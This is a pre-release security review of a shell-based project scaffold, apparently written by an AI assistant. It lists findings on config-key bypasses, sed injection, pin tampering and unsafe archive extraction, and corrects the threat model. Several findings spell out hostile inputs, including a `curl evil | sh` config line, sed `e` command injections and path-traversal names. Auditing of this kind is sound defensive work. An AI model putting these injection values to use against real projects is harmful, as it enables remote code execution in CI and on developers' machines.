# Security review 2026-10-22 — pre-release 0.6.0 (changes since v0.5.0)

Written by `template/prompts/security-review.md` (`/xaden-security`, REQ-055).
A completed review records what was checked; it is not proof that the scaffold is secure.

- Reviewer: Claude Code (Claude Sonnet 5.5), on the maintainer's request
- Version / commit: branch `release/v0.6.0` at `f534d01` (before the tag)
- Threat model: `xaden/threat-model.md` (last reviewed 2026-10-13, stale, see "Threat model corrections"); ASVS L1
- Status of this report: findings 1, 4 and 5 fixed in PR #106 (REQ-157, REQ-159, REQ-158); findings 2 and 3 documented as limits and tracked as REQ-160 (draft); the threat model rows below corrected in the same PR; findings 6 to 15 open, none blocks the release.

## Scope

`git diff v0.5.0..HEAD -- scripts template .github`, read in full for: `scripts/aidd.sh` (REQ-153 pin check),
`template/scripts/check.sh`, `check-settings.sh`, `gate.sh` (`change_base`), `layout.sh` (`conf_get`),
`scripts/scaffold-lib.sh` and `create.sh` (dotted names, sed substitution), `scripts/fetch.sh` (checksum,
signature, REQ-137..139, REQ-147), `scripts/get-xaden.sh`, `scripts/install.sh`, `scripts/semgrep-lock.sh`
with `scripts/adopt/semgrep.lock`, `scripts/adopt/ci.yml` (shellcheck and gitleaks pins, semgrep lock),
`.github/workflows/scaffold-ci.yml`, `scripts/select-smoke-areas.sh`, the completion script in `scripts/xaden.sh`,
the new `template/.semgrep/*.yml`. `xaden/security-exceptions.md` does not exist, so there are no expired rows.

Out of scope: tests and docs except where they make a claim; the website; GitHub-side settings (ruleset, who may
label); `scripts/adopt-lib.sh`, `adopt-scan.sh`, `adopt.sh` (only skimmed through their callers); the behaviour of
the framework's CLI and of a project's own build commands.

## Evidence

- Entry points traced from arguments, `xaden/xaden.conf`, the project's workflow file, environment variables and
  release downloads to sinks (shell, `sed`, paths, git, network, `npx`).
- `is_project_name` called with a two-line value: accepted (shell check in this session, finding 5).
- `conf_get` and the `CONTROLLED_KEYS` regex run on a conf with an indented `check.test = echo pwned`: `conf_get`
  returns the command, the `grep -E` of `check-settings.sh` prints nothing for that line (finding 1).
- `release-signers` and the key embedded in `get-xaden.sh` are identical.
- `semgrep scan --validate --config template/.semgrep`: valid, 54 rules (semgrep 1.182.0 locally; CI pins 1.180.0).
- `shellcheck -S warning` over the scripts listed above: only two SC2034 warnings in `template/scripts/check.sh`
  (`JUDGE_BY_MODE`, `STRICT`), both false positives (set for sourced code). Local shellcheck is 0.11.0, the pin is 0.9.0.
- `grep` of `XADEN_*` names against the threat model's "Environment" entry (finding 8, corrections).
- Not run: `STRICT=1 scripts/check-scaffold.sh` and the smoke suite (the maintainer runs them before the tag);
  no GNU sed was available, so the GNU-only `e` command in finding 5 is unverified.

## Limitations

- Static review. Findings 5 (GNU sed), 6 (npm reads the project's `.npmrc`) and 9 are reasoned from the tools'
  documented behaviour and not executed.
- GitHub-side facts (who may add labels, whether workflow edits are protected) were not inspected.
- The semgrep rules were validated, not tested for false negatives.

## Findings

| # | Severity | Location | Issue (what an attacker does) | Fix |
|---|----------|----------|-------------------------------|-----|
| 1 | high | `template/scripts/check-settings.sh:19,23` vs `template/scripts/layout.sh:35-52` | `conf_get` and `conf_keys` trim leading whitespace from a key; `CONTROLLED_KEYS` is anchored with `^` and allows none. A pull request adds `  check.lint = curl evil \| sh` (leading space or tab) for a key the base lacked: `check-settings.sh` sees no change, `check_mapped_commands` runs it in CI (`conf_keys "check."` finds it). Same for `  findings-status.lint = 1` (hides crashes as findings), `  expect =`, `  hook-checks =`. Defeats REQ-137 without the label. Existing keys are not affected (first match wins and a changed line shows as removed). | Allow `^[[:space:]]*` in `CONTROLLED_KEYS`, or compare the keys through `conf_keys`/`conf_get` instead of a regex. Add a smoke case with an indented key. |
| 2 | medium | `scripts/adopt/ci.yml:101`, `template/scripts/check-settings.sh:2-3` | "A pull request must not judge itself" does not hold: the check is run by the Xaden version and the workflow file of the pull request head. A pull request sets `XADEN_VERSION`/`XADEN_CHECKSUM` (and `version`/`checksum` in `xaden.conf`) to an older real release without `check-settings.sh` (any release before 0.6.0), or edits the workflow, and changes `check.*` in the same pull request: nothing compares, nothing is reported. The checksum matches because the release is genuine. | Document it as an accepted limit and say which control closes it (a ruleset "required workflow", code owners on `.github/` and `xaden/xaden.conf`, REQ-141); or let the check refuse a pin older than the one at the merge base without the label. |
| 3 | medium | `scripts/adopt/ci.yml:100`, `check-settings.sh:6,54` | The label `xaden-settings-accepted` is read as "present on the pull request now". It is not tied to a person who may merge, nor to a commit: a reviewer labels a harmless change, the author pushes a second commit that changes `check.*`, the label stays, CI accepts it. The author with triage rights can label their own pull request. | Accept only when the label was added by someone other than the head's author after the last push (`github.event.label`, `sender`, timeline API), or drop the label and require a review by code owners. At least say in the threat model that the control is exactly as strong as label permissions. |
| 4 | medium | `scripts/aidd.sh:106-110,192-197`, `check-settings.sh:19` | The pin is checked against values stored next to it in `xaden/xaden.conf`. `disable` and `status` take `aidd-cli` without `is_semver`, and `aidd-*` keys are not in `CONTROLLED_KEYS`. A pull request sets `aidd-cli = npm:evil-pkg@1.0.0` (an npm alias spec is a valid `@ai-driven-dev/cli@<spec>`) and `aidd-integrity` to that package's integrity; `hold_pin` passes, and `xaden aidd disable` (after one yes whose text names no version) runs the package through `npx --yes`. Install scripts are off, the package's own code runs. | Validate `aidd-cli` with `is_semver` and `aidd-release` with the release regexp wherever they are read (`hold_pin`), add `aidd-` keys to `CONTROLLED_KEYS`, and show `CLI <version>, release <tag>` in the `disable` question. |
| 5 | medium | `scripts/scaffold-lib.sh:14-17`, `scripts/create.sh:64-65,117-118`, `template/scripts/layout.sh:85` | `is_project_name` pipes the name to `grep -Eq` with `^...$`; grep matches per line, so `$'ab\n<anything>'` passes (the dot check in the `case` is also per whole string). The name goes unquoted into `sed "s/{{PROJECT_NAME}}/$NAME/g"` and into `TARGET=$PWD/$NAME`. (a) With GNU sed, `$'ab\\\n/;e touch x #'` closes the `s` command and runs the `e` command: shell execution from an argument (unverified, BSD sed only errors "unescaped newline"). (b) `$'ab\n/../../x'` makes a target that leaves `$PWD`. Reaches `xaden project create` through any caller that forwards a name (an assistant, a script). The threat model row says the regexp "allows `[a-z][a-z0-9.-]{1,50}` only", which is wrong. | Reject any name containing a newline first (`case $1 in *$'\n'*) return 1`), or match with `[[ $1 =~ ^...$ ]]` / `case` instead of `grep`. Add `$'ab\ncd'` to "reject bad project name". |
| 6 | low | `scripts/aidd.sh:44-52,153-159` | The integrity and the tag are read in the project directory. `npm view` and `npx` honour the project's `.npmrc` (registry). A cloned project that sets its own registry answers the pinned integrity for a different tarball; the REQ-153 check then passes. The accepted risk covers "the registry lies consistently", not "the project picks the registry". Unverified by execution. | Run both calls with `--registry=https://registry.npmjs.org/` and `--userconfig` of an empty file, or from a temporary directory; say so in the accepted risks. |
| 7 | low | `template/scripts/check.sh:147`, `check-settings.sh:19` | `commit-convention` is not a controlled key: a pull request sets `commit-convention = other` and the `Refs:` checks turn advisory in CI without the label. | Add `commit-convention` (and `update-check`, `assistants`) to `CONTROLLED_KEYS`. |
| 8 | low | `scripts/aidd.sh:41-69` | `XADEN_AIDD_RUNNER`, `XADEN_AIDD_NPM_VIEW`, `XADEN_AIDD_LS_REMOTE` replace `npx`, `npm view` and `git ls-remote` with any executable, with no `XADEN_TEST_MODE=1` guard (every other test hook has one). A hostile `.envrc` sets them: the pin check is answered by the attacker and the "CLI" is theirs. Needs control of the environment, which is also control of `PATH`; but the model lists test hooks as inert, and these are not, and they are absent from the "Environment" entry. | Honour them only with `XADEN_TEST_MODE=1`, as `XADEN_TEST_ANSWER` and `XADEN_SIGNERS_FILE` are. |
| 9 | low | `scripts/fetch.sh:294-296` | `branch` is read with `sed` from the project's own `.github/workflows/xaden.yml` and spliced into `sed -e "s/@DEFAULT_BRANCH@/${branch:-main}/g"`. A project whose workflow says `branches: [x/;e id;s/a/b]` injects sed commands when someone runs `xaden project pin` there (GNU sed `e`, BSD sed `w`). Unverified by execution. | Accept only `^[A-Za-z0-9._/-]+$` for `branch`, else use `main`. |
| 10 | low | `scripts/get-xaden.sh:36-39,66-70` | (a) `XADEN_VERSION` is checked with the glob `[0-9]*.[0-9]*.[0-9]*`, which also matches `1.2.3/../../x`; it goes into a URL and into `"$work/unpacked/xaden-$version/..."` (own environment only). (b) `XADEN_ASSETS_URL`/`XADEN_LATEST_URL` are honoured without the confirmation `fetch.sh` asks for (REQ-136); the embedded key still stops a foreign zip, but not a replayed older signed zip of the right directory name. (c) `curl -L` follows redirects to plain http; no `--proto '=https'`. | Check the version with the same rule as `is_semver`; name the overrides in the question; add `--proto '=https' --proto-redir '=https'`. |
| 11 | low | `scripts/adopt/ci.yml:36` | `curl ... \| tar -xz -C "$RUNNER_TEMP"` extracts the release before its tree checksum is verified, and without the `safe_archive` rules of `fetch.sh`. A tag archive that has a symlink member followed by a file through it writes outside before the check fails. The source is the maintainer's own tag over TLS, so it needs a compromised tag. | Download to a file, list and refuse links and `..` as `safe_archive` does, then extract. |
| 12 | low | `template/scripts/check-settings.sh:50-52`, `gate.sh:44` | Fails open and silently: when `change_base` fails in a pull request (a base branch name outside `[A-Za-z0-9._/-]`, a missing `origin/<base>`) the script exits 0 without a line. The gate then reports a pass for a check that did not run. | In a `pull_request` event, a missing base is an error (exit 1, with the reason), not a pass. |
| 13 | info | `template/scripts/check-settings.sh:27-32` | Baselines are compared by line count. A pull request replaces one baseline line with a new finding: the count is equal, nothing is reported. Whether `check.sh` flags stale lines was not verified. | Compare the sets (`comm -13`) instead of the counts. |
| 14 | info | `template/docs/security.md` (changed in this range) | Says the local semgrep rules "cover Python and JavaScript/TypeScript only"; `template/.semgrep/` now holds go, java, php, ruby and rust rules. A claim that is wrong in the safe direction, but a user may skip a review because of it. | Say which languages have rules. |
| 15 | info | `template/scripts/lib.sh:248` | `semgrep scan` honours the project's `.semgrepignore` and inline `nosem`. A pull request can exclude files from SAST; neither is a controlled setting. Unverified for the exact semgrep behaviour in 1.180.0. | Treat `.semgrepignore` like a baseline (a controlled file in `check-settings.sh`). |

Checked and found sound: archive screening and exit codes in `fetch.sh` (`safe_archive`, VERSION must equal the
requested version, checksum compared before `mv`, `|| exit $?` on the subshell); signature verification
(`-n xaden-release`, `-I release@xaden.dev`, `FIRST_SIGNED_VERSION` makes a missing signature an error, test hooks
guarded); `tree_checksum` refuses links and special files (REQ-139) and the CI re-implementation matches it; the
hashed semgrep lock is installed with `--require-hashes --only-binary=:all:` from the verified Xaden tree;
shellcheck and gitleaks are SHA-256 checked; `select-smoke-areas.sh` falls back to `all` on any doubt; the
`check` gate job fails on any failed or cancelled needed job; the completion script prints fixed word lists and
`compgen -W` never receives user input; `pin_main`/`install.sh` refuse to replace a file that is not a Xaden link.

## Threat model corrections

Rows or statements in `xaden/threat-model.md` that are wrong or stale for 0.6.0:

1. Threat "Project name with shell, `sed` or path characters": the mitigation is not true for multi-line values
   (finding 5).
2. "Deployment assumptions": "`scripts/install.sh` writes one symbolic link ... and nothing else outside the
   checkout" is wrong. From a release it copies the tree to `<xaden home>/versions/<version>`, writes `current`, and
   `fetch.sh` writes `<version>.signed` records there.
3. Accepted risk "semgrep and ruff are pinned by version from PyPI, not by hash": true for the scaffold's own CI
   (`pipx install`), no longer for adopted projects (semgrep from `semgrep.lock` with hashes, REQ-146). Bandit and
   pip-audit in the adopted CI are still version-only, and not mentioned.
4. "Downloaded tools in CI" and the gitleaks-only pin row omit shellcheck (SHA-256 verified), bandit, pip-audit and
   the semgrep lock file.
5. Entry points: missing `scripts/get-xaden.sh` (`curl | bash`, embedded key), `check-settings.sh` with the label
   `xaden-settings-accepted` and the merge base as a trust boundary (REQ-137), `XADEN_AIDD_RUNNER`,
   `XADEN_AIDD_NPM_VIEW`, `XADEN_AIDD_LS_REMOTE`, `XADEN_ASSETS_URL`, `XADEN_VERSION`, `XADEN_SIGNING_KEY`,
   `XADEN_ALLOW_NESTED`, `SETTINGS_ACCEPTED`.
6. Accepted risk "a pull request that changes `xaden.conf` needs the same review": REQ-137 now gates this, but
   only as strongly as findings 1 to 3 allow; the row should name the label and the pinned-checker limit.
7. AIDD row: "npm and the framework's repository must answer exactly that" holds for the pin in `xaden.conf`; the pin
   itself is attacker-writable by pull request (finding 4) and the answers come through the project's npm
   configuration (finding 6).
8. "Last reviewed" still names 2026-10-13; the AIDD, update-check and settings gates were added after it.

## Remediation summary

Open: 1 high, 4 medium, 7 low, 3 info. Recommendation before the tag: fix 1 (one regexp and a test), 5 (one
line and a test) and 4 (validate the pin values); decide on 2 and 3 (fix or document as accepted with the
ruleset or code-owners control that closes them); update the threat model rows above. Next trigger: any
change to `CONTROLLED_KEYS`, any new `xaden.conf` key, any new network call or environment variable.
